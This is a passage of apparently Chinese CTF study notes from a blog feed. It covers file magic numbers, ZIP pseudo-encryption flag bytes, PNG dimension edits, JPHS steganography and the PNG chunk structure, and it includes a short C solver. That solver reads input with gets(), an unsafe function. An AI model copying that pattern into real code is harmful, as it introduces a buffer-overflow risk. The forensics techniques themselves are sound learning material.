class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java">JPEG (jpg)，<br>文件头：FFD8FF　　 文件尾：FF D9　<br>　　　　　　　　　　　　　　<br><span class="hljs-title function_">PNG</span> <span class="hljs-params">(png)</span>， 　　<br>文件头：<span class="hljs-number">89504E47</span>　 文件尾：AE <span class="hljs-number">42</span> <span class="hljs-number">60</span> <span class="hljs-number">82</span><br><br>GIF (gif)， 　　<br>文件头：<span class="hljs-number">47494638</span>　 文件尾：<span class="hljs-number">00</span> 3B<br><br>ZIP <span class="hljs-title function_">Archive</span> <span class="hljs-params">(zip)</span>，<br>文件头：504B0304　　 文件尾：<span class="hljs-number">50</span> 4B<br><br><span class="hljs-title function_">TIFF</span> <span class="hljs-params">(tif)</span>， 　<br>文件头：49492A00<br><br>Windows <span class="hljs-title function_">Bitmap</span> <span class="hljs-params">(bmp)</span>， 　<br>文件头：<span class="hljs-number">424D</span><br>　　　　　　<br>CAD (dwg)， 　<br>文件头：<span class="hljs-number">41433130</span>　<br>　　　　　　　　　　　　　　　　　　　　　<br>Adobe <span class="hljs-title function_">Photoshop</span> <span class="hljs-params">(psd)</span>，<br>文件头：<span class="hljs-number">38425053</span>　<br>　　　　　　　　　　　　　　　　　　　　　<br>Rich Text <span class="hljs-title function_">Format</span> <span class="hljs-params">(rtf)</span>，<br>文件头：7B5C727466　<br>　　　　　　　　　　　　　　　　　　　<br><span class="hljs-title function_">XML</span> <span class="hljs-params">(xml)</span>，<br>文件头：3C3F786D6C　<br>　　　　　　　　　　　　　　　　　　　<br><span class="hljs-title function_">HTML</span> <span class="hljs-params">(html)</span>，<br>文件头：68746D6C3E<br><br>Email [thorough only] (eml)，<br>文件头：44656C69766572792D646174653A<br><br>Outlook <span class="hljs-title function_">Express</span> <span class="hljs-params">(dbx)</span>，<br>文件头：CFAD12FEC5FD746F<br><span class="hljs-title function_">Outlook</span> <span class="hljs-params">(pst)</span>，<br>文件头：2142444E<br><br>MS Word/Excel (xls.or.doc)，<br>文件头：D0CF11E0<br><br>MS <span class="hljs-title function_">Access</span> <span class="hljs-params">(mdb)</span>，<br>文件头：5374616E64617264204A<br><br><span class="hljs-title function_">WordPerfect</span> <span class="hljs-params">(wpd)</span>，<br>文件头：FF575043<br><br>Adobe <span class="hljs-title function_">Acrobat</span> <span class="hljs-params">(pdf)</span>，<br>文件头：255044462D312E<br><br><span class="hljs-title function_">Quicken</span> <span class="hljs-params">(qdf)</span>，<br>文件头：AC9EBD8F<br><br>Windows <span class="hljs-title function_">Password</span> <span class="hljs-params">(pwl)</span>，<br>文件头：E3828596<br><br>RAR <span class="hljs-title function_">Archive</span> <span class="hljs-params">(rar)</span>，<br>文件头：<span class="hljs-number">52617221</span><br><br>Wave (wav)， 文件头：<span class="hljs-number">57415645</span><br>AVI (avi)， 文件头：<span class="hljs-number">41564920</span><br>Real <span class="hljs-title function_">Audio</span> <span class="hljs-params">(ram)</span>， 文件头：2E7261FD<br>Real <span class="hljs-title function_">Media</span> <span class="hljs-params">(rm)</span>， 文件头：2E524D46<br><span class="hljs-title function_">MPEG</span> <span class="hljs-params">(mpg)</span>， 文件头：000001BA<br><span class="hljs-title function_">MPEG</span> <span class="hljs-params">(mpg)</span>， 文件头：000001B3<br><span class="hljs-title function_">Quicktime</span> <span class="hljs-params">(mov)</span>， 文件头：6D6F6F76<br>Windows <span class="hljs-title function_">Media</span> <span class="hljs-params">(asf)</span>， 文件头：3026B2758E66CF11<br><span class="hljs-title function_">MIDI</span> <span class="hljs-params">(mid)</span>， 文件头：4D546864<br><br>7z 文件头：<span class="hljs-number">37</span> 7A BC AF <span class="hljs-number">27</span> 1C<br></code></pre></td></tr></table></figure><p>unicode<br>![[Pasted image 20250322213754.png]]</p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/22/%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/"/>
    <url>/2025/03/22/%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<p>加笔记属性<br>ctrl+;</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>杂项总结</title>
    <link href="/2025/03/22/%E6%9D%82%E9%A1%B9%E6%80%BB%E7%BB%93/"/>
    <url>/2025/03/22/%E6%9D%82%E9%A1%B9%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="萌新题1"><a href="#萌新题1" class="headerlink" title="萌新题1"></a>萌新题1</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715076716049-7e2771f9-ca09-40ea-8603-0d6a138ae21b.png">大写字母就是flag，写个简单脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>]=&#123;<span class="hljs-string">&#x27;\0&#x27;</span>&#125;;<br>    <span class="hljs-built_in">gets</span>(s);<br>    <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(s);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(s[i]&gt;=<span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; s[i]&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,s[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715076761369-298a4100-0f01-4b1d-ab66-e1d8851961f4.png"></p><h1 id="ZIP伪加密解析"><a href="#ZIP伪加密解析" class="headerlink" title="ZIP伪加密解析"></a>ZIP伪加密解析</h1><h2 id="1、zip组成"><a href="#1、zip组成" class="headerlink" title="1、zip组成"></a>1、zip组成</h2><p>一个 ZIP 文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。</p><p><a href="https://blog.csdn.net/wclxyn/article/details/7288994">一个zip文件由这样三个部分组成_zip 文件结构_一只独孤的程序猿的博客-CSDN博客</a></p><h2 id="2、实例"><a href="#2、实例" class="headerlink" title="2、实例"></a>2、实例</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319355-6dcd924b-4078-4eb9-a5e9-76d4f3a22d16.png"></p><p><strong>压缩源文件数据区：</strong><br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密） <strong>头文件标记后2bytes</strong><br><strong>压缩源文件目录区：</strong></p><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)</p><p>3F 00：压缩使用的 pkware 版本</p><p>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，伪加密的关键） <strong>目录文件标记后4bytes</strong><br><strong>压缩源文件目录结束标志：</strong><br>50 4B 05 06：目录结束标记</p><h2 id="3、全局方式位标记"><a href="#3、全局方式位标记" class="headerlink" title="3、全局方式位标记"></a>3、全局方式位标记</h2><p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br><strong>第二个数字为奇数时 –&gt;加密</strong><br><strong>第二个数字为偶数时 –&gt;未加密</strong></p><h2 id="4、辨别zip是真加密还是伪加密"><a href="#4、辨别zip是真加密还是伪加密" class="headerlink" title="4、辨别zip是真加密还是伪加密"></a>4、辨别zip是真加密还是伪加密</h2><h3 id="1）无加密"><a href="#1）无加密" class="headerlink" title="1）无加密"></a>1）无加密</h3><p>压缩源文件数据区的全局加密应当为00 00 （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319328-03d43b8d-5052-4baa-b2eb-195421aaf04c.png"></p><h3 id="2）伪加密"><a href="#2）伪加密" class="headerlink" title="2）伪加密"></a>2）伪加密</h3><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319328-1e9272a7-c29d-4a5e-86d9-5b74ceb71adb.png"></p><h3 id="3）真加密"><a href="#3）真加密" class="headerlink" title="3）真加密"></a>3）真加密</h3><p>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00 !</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319344-27b995e7-2657-4e8e-ac7a-8678c9e3f0fb.png"></p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p>把压缩包拖到winhex里打利用WinHex搜索，快速定位到目录区头文件标记处开，50 4B 03 04，这是压缩源文件数据区头文件标记，50 4B 01 02，这是压缩源文件目录区头文件标记，以50为第一处，找到第9、10处数值位置，第9处数值如果是奇数就代表有密码，偶数代表无密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080159737-bf7beda1-57f9-4d7b-b94e-369cd0bab969.png"></p><p>第九位是偶数属于伪加密</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080259574-f206e589-159a-4f39-b5d5-eab6ba7198f2.png"></p><p>把09 00 改成00 00保存后就能打开了</p><h1 id="010、winhex修改图片格式"><a href="#010、winhex修改图片格式" class="headerlink" title="010、winhex修改图片格式"></a>010、winhex修改图片格式</h1><p>从第二行开始，前四位是宽，后四位是高。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080729487-4959214d-7808-42fe-81ca-89fa501f1255.png"></p><h2 id="例题1-修改高度"><a href="#例题1-修改高度" class="headerlink" title="例题1 修改高度"></a>例题1 修改高度</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715081138945-05411f70-0c96-439a-942a-b85b886b4c58.png"></p><p>把后面的的01改成02就可以增加高度，改成00就减小高度</p><p>不知道为什么前面的宽度改不了，改了会变成乱码（将01改成02）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715081597458-73401b1b-a0a0-4296-ad59-46dee88c64ae.png"></p><h2 id="例题2-修改宽度"><a href="#例题2-修改宽度" class="headerlink" title="例题2 修改宽度"></a>例题2 修改宽度</h2><p>将03改成02，下调一个度，就可以看到flag啦</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715081659947-32ed728f-cd1c-4852-a3d3-040d983e483f.png"></p><h1 id="JPHS的使用"><a href="#JPHS的使用" class="headerlink" title="JPHS的使用"></a>JPHS的使用</h1><p>准备阶段：</p><p>有windows和Linux版本的，windows版有可视化界面</p><p>windows可视化界面的下载地址：</p><p>Download for Free JPHS for Windows 0.5 (scanwith.com)</p><p>GitHub下载地址：</p><p>h3xx&#x2F;jphs: jphide &amp; seek steganography tools (github.com)</p><p>使用对象：</p><p>从名字不难看出使用对象是JPEG文件（就是常见的.jpg文件）</p><p>简介：JPEG是联合图象专家组(Joint Picture Expert Group)的英文缩写，是国际标准化组织(ISO)和CCITT联合制定的静态图象的压缩编码标准，比相同图象质量的其它文件格式（静态图象）相比压缩比最高的（高压缩比）</p><p>JPHS介绍：</p><p>对有损压缩JPEG文件进行信息的加密隐藏、探测提取的工具</p><p>JPHS包含2个功能（靠2个程序实现）：</p><p>JPHIDE：能够将信息文件加密隐藏到JPEG图像</p><p>JPSEEK：从用JPHIDE程序加密隐藏得到的JPEG图像中探测并提取到信息文件</p><p>隐藏文件：</p><p>第一步：准备文件</p><p>(test.jpg文件)+（test.txt文本）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082527848-11d91933-aacc-4aa3-96ec-5074f16bf28d.png"></p><p>第二步：（windows版本） 打开软件，点击“Open jpeg”</p><p>使用图形化操作界面的Jphs（Windows版本）——-&gt;点击“Open jpeg”打开JPEG格式图片</p><p>（我这里打开的test.jpg）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082538254-603d3adb-0722-4f01-a14c-2683ee60669c.png"></p><p>打开之后有按钮就不是灰色的了</p><p>并且还会显示JPEG文件的相关信息</p><p>(注：如果打开的不是JPEG文件会自动退出)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082552004-07a3c180-683a-4faa-bb84-290164ee0797.png"></p><p>第三步：点击“Hide”，并输入密码</p><p>点击“Hide”后输入2次相同的密码，并点击ok</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082564963-de35d817-833c-4db5-a0b5-4a70530a261e.png"></p><p>然后选择要隐藏进去的文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082579844-11749991-5770-4311-90ae-3775379d3fe9.png"></p><p>选择之后会在第二个Hidden中显示相关信息</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082588509-45d8fd03-66d1-4777-ac9b-c87c2b6ceed1.png"></p><p>第三步：将他们合并，并另存为</p><p>点击“Save jpeg as”将图片另存为jpeg格式然后输入自己想输入的名字.jpg</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082607181-8db66ec8-3f7b-42b2-aa51-b46859510838.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082633923-c9fa024e-d24b-4dbd-b3fb-e0e541719852.png"></p><p>the file you hid in this jpeg has caused statistically significant change and may be detectable</p><p>您在此JPEG中隐藏的文件导致统计上显着的变化，可能是可检测的</p><p>提取隐藏文件：</p><p>（注：对图片的隐写方式和密码都一无所知的时候，使用Stegdetect进行探测和破解）</p><p>我们这里知道，就可以直接提取吧<img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082644847-6542cc8d-ed0a-4663-b2c8-59ea29496671.png"></p><p>显示出信息就是打开成功了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082652439-5f0fecf2-3eec-4240-806e-ae1e54f70b12.png"></p><p>点击seek，再输入密码进行提取</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082685375-989806db-8a59-4ab6-9d67-867dcda5283a.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082692133-5a26e5ac-afe8-4814-bb34-cc62ab67c9f1.png"></p><p>已经提取到了（和隐藏进去的进行对比，是一样的）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082707161-b0d1b22a-6e8e-4e05-9ce1-87f5f332f5eb.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082714951-c4ba2def-dea0-4768-9bf1-65a6ac81044e.png"></p><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><p>获得一个jpg文件，打开然后保存为txt文件，再存为png文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715083184886-15f6ff7e-feec-4719-b9de-7015742403f3.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715083222397-7684b0f2-64c4-4305-8181-03fbf4363b53.png"></p><p>然后请看二维码解密部分</p><h1 id="PNG文件格式详解"><a href="#PNG文件格式详解" class="headerlink" title="PNG文件格式详解"></a>PNG文件格式详解</h1><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>PNG是20世纪90年代中期开始开发的图像文件存储格式，其目的是替代GIF和<a href="https://so.csdn.net/so/search?q=TIFF&spm=1001.2101.3001.7020">TIFF</a>文件格式，同时增加一些GIF文件格式所不具备的特性。流式网络图形格式(Portable Network Graphic Format，PNG)名称来源于非官方的“PNG’s Not GIF”，是一种位图文件(bitmap file)存储格式，读成“ping”。PNG用来存储灰度图像时，灰度图像的深度可多到16位，存储彩色图像时，彩色图像的深度可多到48位，并且还可存储多到16位的α通道数据。PNG使用从LZ77派生的无损数据压缩算法。（说白了这就是一种方便的、适于网络传播的轻便图片文件格式）</p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ol><li>使用调色板技术可支持256种颜色的彩色图像。（必须的）</li><li>流式读&#x2F;写性(streamability)：图像文件格式允许连续读出和写入图像数据。（因此适于网络传播）</li><li>逐次逼近显示(progressive display)：这种特性可使在通信链路上传输图像文件的同时就在终端上显示图像，把整个轮廓显示出来之后逐步显示图像的细节，也就是先用低分辨率显示图像，然后逐步提高它的分辨率。（类似马赛克逐渐消除的过程）</li><li>透明性(transparency)：这个性能可使图像中某些部分不显示出来，用来创建一些有特色的图像。</li><li>辅助信息(ancillary information)：这个特性可用来在图像文件中存储一些文本注释信息。（就是可以说一些废话）</li><li>独立于计算机软硬件环境。</li><li>使用无损压缩。（无损！）</li><li>可在一个文件中存储多幅图像。</li></ol><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><p>PNG图像格式文件由文件署名和数据块(chunk)组成。</p><h4 id="文件署名域"><a href="#文件署名域" class="headerlink" title="文件署名域"></a>文件署名域</h4><p>8字节的PNG文件署名域用来识别该文件是不是PNG文件。该域的值是：</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>十进制数</strong></td><td><strong>十六进制数</strong></td></tr><tr><td>137</td><td>89</td></tr><tr><td>80</td><td>50</td></tr><tr><td>78</td><td>4e</td></tr><tr><td>71</td><td>47</td></tr><tr><td>13</td><td>0d</td></tr><tr><td>10</td><td>0a</td></tr><tr><td>26</td><td>1a</td></tr><tr><td>10</td><td>0a</td></tr></tbody></table><p>这个文件署名就是在<a href="https://blog.mythsman.com/2015/12/01/1/">《利用文件头标志判断文件类型》</a>中提到的文件头标志了，很简单。</p><h4 id="数据块"><a href="#数据块" class="headerlink" title="数据块"></a>数据块</h4><p>这里有两种类型的数据块，一种是称为关键数据块(critical chunk)，就是必须要有的块；另一种叫做辅助数据块(ancillary chunks)。</p><p>每个数据块都由下表所示的的4个域组成。</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>名称</strong></td><td><strong>字节数</strong></td><td><strong>说明</strong></td></tr><tr><td>Length(长度)</td><td>4字节</td><td>指定数据块中数据域的长度，其长度不超过(231−1)(231−1)字节</td></tr><tr><td>Chunk Type Code(数据块类型码)</td><td>4字节</td><td>数据块类型码由ASCII字母(A-Z和a-z)组成</td></tr><tr><td>Chunk Data(数据块实际内容</td><td>可变长度</td><td>存储按照Chunk Type Code指定的数据</td></tr><tr><td>CRC(循环冗余检测</td><td>4字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><p>其中CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的，可以看做一种校验码。</p><h4 id="关键数据块"><a href="#关键数据块" class="headerlink" title="关键数据块"></a>关键数据块</h4><p>关键数据块中的4个标准数据块是：</p><p>(1) 文件头数据块IHDR(header chunk)：</p><p>它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p>文件头数据块由13字节，组成结构如下：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>域的名称</strong></td><td><strong>字节数</strong></td><td><strong>说明</strong></td></tr><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度：索引彩色图像：1，2，4或8 ;灰度图像：1，2，4，8或16 ;真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型：0：灰度图像, 1，2，4，8或16;2：真彩色图像，8或16;3：索引彩色图像，1，2，4或84：带α通道数据的灰度图像，8或16;6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法：0：非隔行扫描;1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><p>(2) 调色板数据块PLTE(palette chunk)：</p><p>它包含有与索引彩色图像((indexed-color image))相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。真彩色的PNG数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。结构如下：</p><p>|颜色|字节|意义|<br>|Red|1 byte||0 &#x3D; 黑色, 255 &#x3D; 红|<br>|Green|1 byte||0 &#x3D; 黑色, 255 &#x3D; 绿色|<br>|Blue|1 byte||0 &#x3D; 黑色, 255 &#x3D; 蓝色|</p><p>PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，因此调色板数据块所包含的最大字节数为768，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。</p><p>对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4&#x3D;16），否则，这将导致PNG图像不合法。</p><p>(3) 图像数据块IDAT(image data chunk)：</p><p>它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p><p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</p><p>(4) 图像结束数据IEND(image trailer chunk)：</p><p>它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p><p>最后，除了表示数据块开始的IHDR必须放在最前面， 表示PNG文件结束的IEND数据块放在最后面之外，其他数据块的存放顺序没有限制。</p><h4 id="辅助数据块"><a href="#辅助数据块" class="headerlink" title="辅助数据块"></a>辅助数据块</h4><p>（比较杂，不需要全部了解透）</p><p>PNG文件格式规范制定的10个辅助数据块是：</p><ol><li>背景颜色数据块bKGD(background color)。</li><li>基色和白色度数据块cHRM(primary chromaticities and white point)。所谓白色度是指当R＝G＝B＝最大值时在显示器上产生的白色度。</li><li>图像γ数据块gAMA(image gamma)。</li><li>图像直方图数据块hIST(image histogram)。</li><li>物理像素尺寸数据块pHYs(physical pixel dimensions)。</li><li>样本有效位数据块sBIT(significant bits)。</li><li>文本信息数据块tEXt(textual data)。</li><li>图像最后修改时间数据块tIME (image last-modification time)。</li><li>图像透明数据块tRNS (transparency)。</li><li>压缩文本数据块zTXt (compressed textual data)。</li></ol><h4 id="数据块摘要"><a href="#数据块摘要" class="headerlink" title="数据块摘要"></a>数据块摘要</h4><p>关键数据块、辅助数据块和专用公共数据块(special-purpose public chunks)综合下表中：</p><table><thead><tr><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>数据块符号</strong></td><td><strong>数据块名称</strong></td><td><strong>多数据块</strong></td><td><strong>可选否</strong></td><td><strong>位置限制</strong></td></tr><tr><td>IHDR</td><td>文件头数据块</td><td>否</td><td>否</td><td>第一块</td></tr><tr><td>cHRM</td><td>基色和白色点数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>gAMA</td><td>图像γ数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>sBIT</td><td>样本有效位数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>PLTE</td><td>调色板数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>bKGD</td><td>背景颜色数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>hIST</td><td>图像直方图数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>tRNS</td><td>图像透明数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>oFFs</td><td>(专用公共数据块)</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>pHYs</td><td>物理像素尺寸数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>sCAL</td><td>(专用公共数据块)</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>IDAT</td><td>图像数据块</td><td>是</td><td>否</td><td>与其他IDAT连续</td></tr><tr><td>tIME</td><td>图像最后修改时间数据块</td><td>否</td><td>是</td><td>无限制</td></tr><tr><td>tEXt</td><td>文本信息数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>zTXt</td><td>压缩文本数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>fRAc</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFg</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFt</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFx</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>IEND</td><td>图像结束数据</td><td>否</td><td>否</td><td>最后一个数据块</td></tr></tbody></table><p>tEXt和zTXt数据块中的标准关键字：</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>关键字</strong></td><td><strong>说明</strong></td></tr><tr><td>Title</td><td>图像名称或者标题</td></tr><tr><td>Author</td><td>图像作者名</td></tr><tr><td>Description</td><td>图像说明</td></tr><tr><td>Copyright</td><td>版权声明</td></tr><tr><td>CreationTime</td><td>原图创作时间</td></tr><tr><td>Software</td><td>创作图像使用的软件</td></tr><tr><td>Disclaimer</td><td>弃权</td></tr><tr><td>Warning</td><td>图像内容警告</td></tr><tr><td>Source</td><td>创作图像使用的设备</td></tr><tr><td>Comment</td><td>各种注释</td></tr></tbody></table><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><p>为了便于研究，我在本地找了个24x24像素的图片：</p><p>用十六进制打开后是这样的：</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><code>&lt;br&gt;1&lt;br&gt;2&lt;br&gt;3&lt;br&gt;4&lt;br&gt;5&lt;br&gt;6&lt;br&gt;7&lt;br&gt;8&lt;br&gt;9&lt;br&gt;10&lt;br&gt;11&lt;br&gt;12&lt;br&gt;13&lt;br&gt;14&lt;br&gt;15&lt;br&gt;16&lt;br&gt;17&lt;br&gt;18&lt;br&gt;19&lt;br&gt;20&lt;br&gt;21&lt;br&gt;22&lt;br&gt;23&lt;br&gt;24&lt;br&gt;25&lt;br&gt;26&lt;br&gt;27&lt;br&gt;28&lt;br&gt;29&lt;br&gt;30&lt;br&gt;31&lt;br&gt;32&lt;br&gt;33&lt;br&gt;34&lt;br&gt;35&lt;br&gt;36&lt;br&gt;37&lt;br&gt;38&lt;br&gt;39&lt;br&gt;40&lt;br&gt;41&lt;br&gt;42&lt;br&gt;43&lt;br&gt;44&lt;br&gt;45&lt;br&gt;46&lt;br&gt;47&lt;br&gt;48&lt;br&gt;49&lt;br&gt;50&lt;br&gt;51&lt;br&gt;52&lt;br&gt;53&lt;br&gt;54&lt;br&gt;55&lt;br&gt;56&lt;br&gt;57&lt;br&gt;58&lt;br&gt;59&lt;br&gt;</code></td><td><code>&lt;br&gt;0000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR&lt;br&gt;0000010: 0000 0018 0000 0018 0806 0000 00e0 773d  ..............w=&lt;br&gt;0000020: f800 0000 1974 4558 7453 6f66 7477 6172  .....tEXtSoftwar&lt;br&gt;0000030: 6500 4164 6f62 6520 